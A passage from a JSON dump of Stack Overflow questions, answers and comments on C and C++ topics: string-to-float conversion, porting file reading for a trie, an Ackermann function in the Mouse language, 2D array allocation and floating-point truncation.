{\n  float x;\n  char a[20];\n  strcpy(a,argv[1]);\n  x = strtof(a);\n  printf(\"%s\\n\",a);\n  printf(\"%f\\n\",x);\n  return 0;\n}\n</code></pre>\n\n<p>No luck. Here's output, on the command line:</p>\n\n<pre><code>prompt$ ./a.out 2.34\n2.34\n1426063.000000\nprompt$\n</code></pre>\n\n<p>If I use atoi() instead, I get 0.0. </p>\n\n<p>Clearly there is something simple I'm missing. This is with gcc 4.8.4 on ubuntu fwiw.</p>\n\n<p>Makes no difference if I compile with -static flag, or use double instead of float (and %e instead of %f), or include math.h. The output changes in some of those cases, but it's still nonsense.</p>\n\n<p>Thanks,\nPeter</p>\n"}, {"tags": ["c++", "c", "file-handling"], "comments": [{"owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "edited": false, "score": 1, "creation_date": 1449692057, "post_id": 34188057, "comment_id": 56122530, "body": "The second reads character by character, the first one doesn&#39;t."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1449692197, "post_id": 34188057, "comment_id": 56122620, "body": "Please describe your problem in more detail. &quot;Doesn&#39;t work&quot; is never a good problem description. Describe the input, the expected behaviour and the actual behaviour."}, {"owner": {"reputation": 31, "user_id": 4283615, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/wYGF0.jpg?s=128&g=1", "display_name": "Ahsan Asif", "link": "https://stackoverflow.com/users/4283615/ahsan-asif"}, "edited": false, "score": 0, "creation_date": 1449693180, "post_id": 34188057, "comment_id": 56123186, "body": "It doesnt make a trie structure properly if use the c++ code while it works perfectly fine for the C code."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 4283615, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/wYGF0.jpg?s=128&g=1", "display_name": "Ahsan Asif", "link": "https://stackoverflow.com/users/4283615/ahsan-asif"}, "edited": false, "score": 0, "creation_date": 1449693006, "post_id": 34188199, "comment_id": 56123099, "body": "Its character array not a string. Now what?"}, {"owner": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1449693465, "post_id": 34188199, "comment_id": 56123341, "body": "<code>word.c_str()</code> may help you there. You&#39;ll have to tweak <code>buildTrie</code> to take <code>const char *</code> if it doesn&#39;t already."}, {"owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "reply_to_user": {"reputation": 28836, "user_id": 4581301, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e5580eebb22e2c65c9b2325d2276d92a?s=128&d=identicon&r=PG&f=1", "display_name": "user4581301", "link": "https://stackoverflow.com/users/4581301/user4581301"}, "edited": false, "score": 0, "creation_date": 1449693542, "post_id": 34188199, "comment_id": 56123387, "body": "@user4581301: No. Tweak (or overload) <code>buildTrie</code> to take a <code>std::string const &amp;</code>."}], "tags": [], "owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "is_accepted": false, "score": 1, "last_activity_date": 1449692232, "creation_date": 1449692232, "answer_id": 34188199, "question_id": 34188057, "link": "https://stackoverflow.com/questions/34188057/filing-mistake-when-converting-from-c-to-c/34188199#34188199", "title": "Filing mistake when converting from c to c++", "body": "<p>If I were writing code like this in C++, I'd probably write something more like this:</p>\n\n<pre><code>std::string word;\n\nwhile (std::getline(infile, word))\n    buildTrie(temp, word);\n</code></pre>\n\n<p>In all honesty, I doubt I'd write code exactly like that either though--I'd probably wrap the <code>trie</code> up into a class, so the code would look more like:</p>\n\n<pre><code>Trie t;\nstd::string word;\n\nwhile std::getline(infile, word))\n    t.add(word);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 54044, "user_id": 3723423, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a2c916310a1261b53773de75fc83e5ad?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/3723423/christophe"}, "reply_to_user": {"reputation": 31, "user_id": 4283615, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/wYGF0.jpg?s=128&g=1", "display_name": "Ahsan Asif", "link": "https://stackoverflow.com/users/4283615/ahsan-asif"}, "edited": false, "score": 0, "creation_date": 1449693513, "post_id": 34188210, "comment_id": 56123370, "body": "Looking at your C code,  the part that you&#39;ve displayed should work as it should.  A simple verification would be to display word instead of calling buildTree():  the display should be the same.  I assume the problem is in buildTrie (or even newNode() if you&#39;ve kept some malloc() ).  You have to post more code to get more help."}], "tags": [], "owner": {"reputation": 54044, "user_id": 3723423, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a2c916310a1261b53773de75fc83e5ad?s=128&d=identicon&r=PG&f=1", "display_name": "Christophe", "link": "https://stackoverflow.com/users/3723423/christophe"}, "is_accepted": false, "score": 1, "last_activity_date": 1449692270, "creation_date": 1449692270, "answer_id": 34188210, "question_id": 34188057, "link": "https://stackoverflow.com/questions/34188057/filing-mistake-when-converting-from-c-to-c/34188210#34188210", "title": "Filing mistake when converting from c to c++", "body": "<p>If you want to keep using char arrays and c-strings use <a href=\"http://www.cplusplus.com/reference/istream/istream/getline/\" rel=\"nofollow\"><code>istream::getline()</code></a> to read as in your c programme: </p>\n\n<pre><code>infile.open(\"small.txt\");\nwhile(infile.getline(word, MAX_LINE) )\n{\n    temp = root;\n    buildTrie(temp, word);\n}\ninfile.close();\n</code></pre>\n\n<p>Be carefull to loop on the read operation.  </p>\n\n<p>Now depending on the rest of your code,  you could also consider to migrate from <code>char[]</code> to <code>string</code>.  This has lots of advantages and is more in the c++ philosophy.   You can then use <a href=\"http://www.cplusplus.com/reference/string/string/getline/?kw=getline\" rel=\"nofollow\"><code>std::getline()</code></a> as suggested by Jerry in his answer.  </p>\n"}], "owner": {"reputation": 31, "user_id": 4283615, "user_type": "registered", "accept_rate": 20, "profile_image": "https://i.stack.imgur.com/wYGF0.jpg?s=128&g=1", "display_name": "Ahsan Asif", "link": "https://stackoverflow.com/users/4283615/ahsan-asif"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1449692270, "creation_date": 1449691712, "question_id": 34188057, "link": "https://stackoverflow.com/questions/34188057/filing-mistake-when-converting-from-c-to-c", "title": "Filing mistake when converting from c to c++", "body": "<p>The problem im having is that i wrote a code in c for filing for my program and when i wrote the same code in c++ it wasn't working. Please help me find out the mistake i'm making while writing the code in c++.</p>\n\n<p>C Code :</p>\n\n<pre><code>FILE* dict = fopen(\"small.txt\", \"r\");\nchar word[MAX_LINE];\nNode* root = newNode(); // pointer to main root of Trie\nNode* temp;\nwhile (fgets(word, MAX_LINE, dict) != NULL) {\n      temp = root;\n    buildTrie(temp, word);\n}\nfclose(dict);\n</code></pre>\n\n<p>C++ Code :</p>\n\n<pre><code>ifstream infile;\nchar word[MAX_LINE];\nNode* root = newNode(); // pointer to main root of Trie\nNode* temp;\n\ninfile.open(\"small.txt\");\nwhile(infile)\n{\n  for(int i =0;i&lt;MAX_LINE;i++)\n  {\n      infile&gt;&gt;word[i];\n      temp = root;\n    buildTrie(temp, word);\n\n  }\n}\ninfile.close();\n</code></pre>\n"}, {"tags": ["c", "math", "optimization", "interpreter"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1449691620, "post_id": 34187687, "comment_id": 56122271, "body": "Does the interpreter translate to byte code, or is it a straight interpreter? Interpreters tend to be slow compared to compiled languages, and Ackerman&#39;s function is designed to be expensive. That combination is likely to be a perfect storm."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1449691662, "post_id": 34187687, "comment_id": 56122300, "body": "I&#39;m voting to close this question as off-topic because the question is about third-party code."}, {"owner": {"reputation": 3392, "user_id": 4532996, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/uXkl2.png?s=128&g=1", "display_name": "cat", "link": "https://stackoverflow.com/users/4532996/cat"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1449691662, "post_id": 34187687, "comment_id": 56122301, "body": "@Barmar it&#39;s a straight interpreter; it doesn&#39;t compile or assemble."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1449692641, "post_id": 34187687, "comment_id": 56122879, "body": "The interpreter immediately prints a (very long and cryptic) error message, apparently because of a stack overflow. Doesn&#39;t hog anything. I have no idea why anyone should spend any amount of time debugging this. Note that the first interpreter you link requires fixing a dozen or so broken format strings."}, {"owner": {"reputation": 3392, "user_id": 4532996, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/uXkl2.png?s=128&g=1", "display_name": "cat", "link": "https://stackoverflow.com/users/4532996/cat"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1449692703, "post_id": 34187687, "comment_id": 56122925, "body": "@n.m. It&#39;s not an error message; that&#39;s the program&#39;s output."}, {"owner": {"reputation": 3392, "user_id": 4532996, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/uXkl2.png?s=128&g=1", "display_name": "cat", "link": "https://stackoverflow.com/users/4532996/cat"}, "reply_to_user": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1449692804, "post_id": 34187687, "comment_id": 56122987, "body": "@n.m. make sure you used <a href=\"https://github.com/catb0t/newmouse/blob/master/mouse.c\" rel=\"nofollow noreferrer\">this</a> version of the interpreter which has an increased stack size"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1449692860, "post_id": 34187687, "comment_id": 56123018, "body": "If normal program output comes from a function named <code>error</code>, that&#39;s one more reason to never look at this code again. Yes I have used this version and increased the stack size myself too. I want my 15 minutes back."}], "answers": [{"tags": [], "owner": {"reputation": 881, "user_id": 5635258, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b69b37f21456c0333195948af74563b9?s=128&d=identicon&r=PG&f=1", "display_name": "StephenG", "link": "https://stackoverflow.com/users/5635258/stepheng"}, "is_accepted": false, "score": 1, "last_activity_date": 1449693560, "creation_date": 1449693560, "answer_id": 34188542, "question_id": 34187687, "link": "https://stackoverflow.com/questions/34187687/why-does-the-ackermann-function-take-so-long-in-this-mouse-interpreter-written-i/34188542#34188542", "title": "Why does the Ackermann function take so long in this Mouse interpreter written in C?", "body": "<p>On the question of why is it slower than Python or Go, that's probably because writing and developing high performance interpreters and compilers is very hard.  Python and Go have probably had way more work done on them.  Python, for example, did not always perform as well as it does now and is an important language that gets a lot of attention.</p>\n\n<p>As with most things, it's horses for courses.  The choice of programming language is about what it's most suited to.  There are things which are tedious to do in e.g. C that are a snip in Python, but for high performance I'd generally go with C.</p>\n"}], "owner": {"reputation": 3392, "user_id": 4532996, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/uXkl2.png?s=128&g=1", "display_name": "cat", "link": "https://stackoverflow.com/users/4532996/cat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125, "favorite_count": 0, "closed_date": 1449699789, "answer_count": 1, "score": 0, "last_activity_date": 1449693560, "creation_date": 1449690424, "last_edit_date": 1449691501, "question_id": 34187687, "link": "https://stackoverflow.com/questions/34187687/why-does-the-ackermann-function-take-so-long-in-this-mouse-interpreter-written-i", "closed_reason": "Not suitable for this site", "title": "Why does the Ackermann function take so long in this Mouse interpreter written in C?", "body": "<p>I wrote the following <a href=\"http://mouse.davidgsimpson.com/\" rel=\"nofollow\">Mouse</a> program to compute the <a href=\"https://en.wikipedia.org/wiki/Ackermann_function\" rel=\"nofollow\">Ackermann function</a>:</p>\n\n\n\n<pre class=\"lang-none prettyprint-override\"><code>~ Ackermann function in Mouse.\n~ A(0,n) = n+1\n~ A(m,0) = A(m-1,1)\n~ A(m,n) = A(m-1,A(m,n-1))\n\n1 a:  ~ set a to 1\n7 b:  ~ set b to 2\n\n#Y, a. b.;  ~ call ack like Y(a, b);\n\n$Y 1% n: 2% m:               ~ ack\n  m. 0 = k:                  ~ store whether m == 0 in k\n  n. 0 = j:\n  j. k. &gt; [                    ~ if y&gt;x (m==0)\n    n.1+!                      ~ add 1 + print it\n  | j. k. &lt; [                  ~ else if x&gt;y (n==0)\n    #Y, m. 1-, 1;!             ~ call ack like Y(m-1, 1)\n  | #Y, m. 1-, #Y, m.,n. 1-;;! ~ else, ack like Y(m-1, Y(m, n-1))\n    ]\n   ]\n  ]\n@ ~ end ack\n$ ~ end prog\n</code></pre>\n\n<p>You can test it using <a href=\"https://github.com/catb0t/newmouse/blob/master/mouse.c\" rel=\"nofollow\">this</a> interpreter written in C. Perhaps it's to do with mouse being stack-based, but this simple program doesn't finish for at least 15 minutes (I got impatient and it was hogging all my CPUs).</p>\n\n<p>In Golang or Python, <code>Ackermann(1, 7)</code> or even <code>Ackermann(3, 10)</code> compute in a second or less. </p>\n\n<p>Is there a fault in the compiler/interpreter (and what can I do to improve it?), or is my algorithm in Mouse terrible?</p>\n\n<hr>\n\n<p>Note: <a href=\"http://mouse.davidgsimpson.com/mouse2002/mouse_c.txt\" rel=\"nofollow\">here</a> is the original (well commented!!) version of the interpreter, which requires bugfixing before <code>gcc</code> agrees to compile it.</p>\n"}, {"tags": ["c", "arrays", "malloc", "free", "realloc"], "comments": [{"owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "edited": false, "score": 0, "creation_date": 1449690472, "post_id": 34187660, "comment_id": 56121617, "body": "looks ok, except don&#39;t cast return type of <code>malloc</code>."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1449690481, "post_id": 34187660, "comment_id": 56121624, "body": "If <code>p</code> is a pointer to a pointer to <code>int</code>, then <code>*p</code> is a pointer to <code>int</code>, so you&#39;re probably allocating more memory than you need. Oh, and <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">in C you should not cast the result of <code>malloc</code></a>. Also note that just because you have a pointer, you can still use array indexing syntax, for any array <i>or pointer</i> <code>p</code> and index <code>i</code>, the expression <code>*(p + i)</code> is equivalent to <code>p[i]</code>."}, {"owner": {"reputation": 533, "user_id": 5613000, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d21885cdf3eab3a31152c12315051c78?s=128&d=identicon&r=PG&f=1", "display_name": "Ryan Fitzpatrick", "link": "https://stackoverflow.com/users/5613000/ryan-fitzpatrick"}, "edited": false, "score": 0, "creation_date": 1449690527, "post_id": 34187660, "comment_id": 56121657, "body": "Looks good, have you tested the program with valgrind r another tool?"}, {"owner": {"reputation": 63, "user_id": 5594758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4442f38a0be3b9d397b03146eeff82f5?s=128&d=identicon&r=PG&f=1", "display_name": "703", "link": "https://stackoverflow.com/users/5594758/703"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449691152, "post_id": 34187660, "comment_id": 56122011, "body": "I used valgrind and it shows no errors. However i suspected that i am allocating more memory than needed. @Joachim - can you please suggest how to edit it?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449724644, "post_id": 34187660, "comment_id": 56134409, "body": "How about e.g. <code>p = malloc(sizeof(*p) * cap);</code> for the outer array, and in the loop e.g. <code>p[i] = malloc(sizeof(*p[i]) * cols);</code>."}], "answers": [{"tags": [], "owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "is_accepted": false, "score": 1, "last_activity_date": 1449692062, "creation_date": 1449692062, "answer_id": 34188149, "question_id": 34187660, "link": "https://stackoverflow.com/questions/34187660/correct-memory-allocation-deallocation-for-2d-array/34188149#34188149", "title": "Correct memory allocation/deallocation for 2D array?", "body": "<p>This isn't really an answer, but it's too long for a comment - especially with the example code.</p>\n\n<p>One easy optimization is to do just one allocation for the entire data area of a multi-dimensional array, and create arrays as necessary for the pointers into the data array.  This will dramatically reduce the number of separate memory allocations - which can be important as the size of the array increases.  Reducing the number of dynamic allocations that use <code>malloc()</code> (or <code>new</code> in C++) can also be extremely important for multithreaded applications as memory allocations tend to be single-threaded to a very large degree even for allocators targeted for multithreaded use.</p>\n\n<p>You can do a 2-dimensional array with only two allocations:</p>\n\n<pre><code>int **alloc2IntArray( size_t m, size_t n )\n{\n    // get an array of pointers\n    int **array = malloc( m * sizeof( *array ) );\n    if ( NULL == array ) // I do this in case I mistype \"==\" as \"=\"\n    {\n        return( NULL );\n    }\n\n    // get the actual data area of the array\n    // (this gets all rows in one allocation)\n    array[ 0 ] = malloc( m * n * sizeof( **array ) );\n    if ( NULL == array[ 0 ] )\n    {\n        free( array );\n        return( NULL );\n    }\n\n    // fill in the array of pointers\n    // start at 1 because array[ 0 ] already\n    // points to the 0th row\n    for ( size_t i = 1U; i &lt; m; i++ )\n    {\n        // use extra parenthesis to make it\n        // clear what's going on - assigning the\n        // address of the start of the i-th\n        // row in the data area that array[ 0 ]\n        // points to into the array of pointers,\n        // which array points to (array[ 0 ]\n        // already points to the 0th row)\n        array[ i ] = &amp;( ( array[ 0 ] )[ i * n ] );\n    }\n\n    return( array );\n}\n</code></pre>\n\n<p>and</p>\n\n<pre><code>void free2dIntArray( int **array )\n{\n    free( array[ 0 ] );\n    free( array );\n}\n</code></pre>\n\n<p>You can use the same technique for an arbitrary number of dimensions, such that an N-dimensional array can be allocated with just N allocations.</p>\n\n<p>And if you really want to, you can reduce the number of allocations down to just one - but then you have to worry about size of pointers and the alignment of all the elements.</p>\n"}], "owner": {"reputation": 63, "user_id": 5594758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4442f38a0be3b9d397b03146eeff82f5?s=128&d=identicon&r=PG&f=1", "display_name": "703", "link": "https://stackoverflow.com/users/5594758/703"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 2, "answer_count": 1, "score": 1, "last_activity_date": 1449692062, "creation_date": 1449690309, "last_edit_date": 1449691199, "question_id": 34187660, "link": "https://stackoverflow.com/questions/34187660/correct-memory-allocation-deallocation-for-2d-array", "title": "Correct memory allocation/deallocation for 2D array?", "body": "<p>i wonder if am correctly allocating and freeing memory. Am i allocating just the right amount of memory? Is the free() used as it should be? In next step i am supposed to reallocate memory for array with more rows ... any hint how realloc would look like? </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define cols        2\n\nint** allocArray (unsigned int cap)\n{\nint** p;\nunsigned int i;\np = (int **)malloc(sizeof(p)*cap);\nfor (i=0;i&lt;cap;i++) {\n    *(p+i) = (int *)malloc(sizeof(*p)*cols);\n}\nreturn p;\n}\n\nvoid freeArray (int** p, unsigned int cap)\n{\nint i;\nfor (i=0;i&lt;cap;i++) {\n    free(*(p+i));\n}\nfree(p);\n}\n\nint main(void)\n{\nint** arr;\nunsigned int cap = 2;\n\narr = allocArray(cap);\nfreeArray(arr,cap); \n\nreturn 0;\n}\n</code></pre>\n\n<p>Thanks a lot for any input.</p>\n"}, {"tags": ["c", "floating-point"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1449690416, "post_id": 34187562, "comment_id": 56121580, "body": "It&#39;s classic FP/truncation/whatever, who cares?"}, {"owner": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 1, "creation_date": 1449690468, "post_id": 34187562, "comment_id": 56121610, "body": "<a href=\"http://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html\" rel=\"nofollow noreferrer\">What Every Computer Scientist Should Know About Floating-Point Arithmetic</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449690468, "post_id": 34187562, "comment_id": 56121614, "body": "MSVC the answer is <code>118</code>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449690640, "post_id": 34187562, "comment_id": 56121710, "body": "Step 1, the <code>double</code> representations might not be exact. Step 2, you have your variable types all mixed up, between <code>unsigned char</code> and <code>int</code> and <code>double</code>. New question. Why does my ladder fall over when I use the wrong side?"}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449690828, "post_id": 34187562, "comment_id": 56121804, "body": "@WeatherVane the question here is why it fails ! i pretty much know how to solve it ! whats behind it.  if 1.18 works did you try 1.13 , ! also the more specific question why compilers handle it in differnt ways and what the relation between 1.18 and 1.13 , 1.17 , 1.17 etc"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449690857, "post_id": 34187562, "comment_id": 56121819, "body": "Nope, I didn&#39;t bother, I would not even code like that. I thought I had explained why."}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449691073, "post_id": 34187562, "comment_id": 56121957, "body": "@WeatherVane : then that&#39;s make me wonder why you even cared to test it with MSVC , or follow the answer! if you dont know the answer i believe you should wait for some one with experience to answer rather than &quot; i don&#39;t care &quot; statement"}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "reply_to_user": {"reputation": 10498, "user_id": 669576, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/mRhrB.jpg?s=128&g=1", "display_name": "Johnny Mopp", "link": "https://stackoverflow.com/users/669576/johnny-mopp"}, "edited": false, "score": 0, "creation_date": 1449691150, "post_id": 34187562, "comment_id": 56122009, "body": "@JohnnyMopp Thanks alot. That could help me."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 1, "creation_date": 1449691153, "post_id": 34187562, "comment_id": 56122013, "body": "If you knew how to fix it, why did you bother wasting our time asking about it?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1449691157, "post_id": 34187562, "comment_id": 56122016, "body": "@HossamSoffar because I took the trouble to make sure I know what your code is doing, before commenting, and that was even before the downvoted answer. And because it&#39;s crap code, that&#39;s why I don&#39;t test any other values."}, {"owner": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "edited": false, "score": 0, "creation_date": 1449691320, "post_id": 34187562, "comment_id": 56122115, "body": "on codechef.com it works correctly with &quot;C++&quot; and &quot;C++14&quot;, does not work correctly with &quot;C99 Strict&quot;."}, {"owner": {"reputation": 74, "user_id": 2397434, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/874b1de044126a715c14c24402b8aca3?s=128&d=identicon&r=PG", "display_name": "Hossam Soffar", "link": "https://stackoverflow.com/users/2397434/hossam-soffar"}, "reply_to_user": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "edited": false, "score": 0, "creation_date": 1449691512, "post_id": 34187562, "comment_id": 56122217, "body": "@MikeNakis : yes thats exactly my question. Why doesn&#39;t it work?"}, {"owner": {"reputation": 46142, "user_id": 773113, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/FKKLW.jpg?s=128&g=1", "display_name": "Mike Nakis", "link": "https://stackoverflow.com/users/773113/mike-nakis"}, "edited": false, "score": 0, "creation_date": 1449691563, "post_id": 34187562, "comment_id": 56122243, "body": "I don&#39;t know.  I am just reporting my findings, so that people don&#39;t think you are dreaming things up.  I am really annoyed by the downvotes and by people&#39;s dismissive attitude."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": 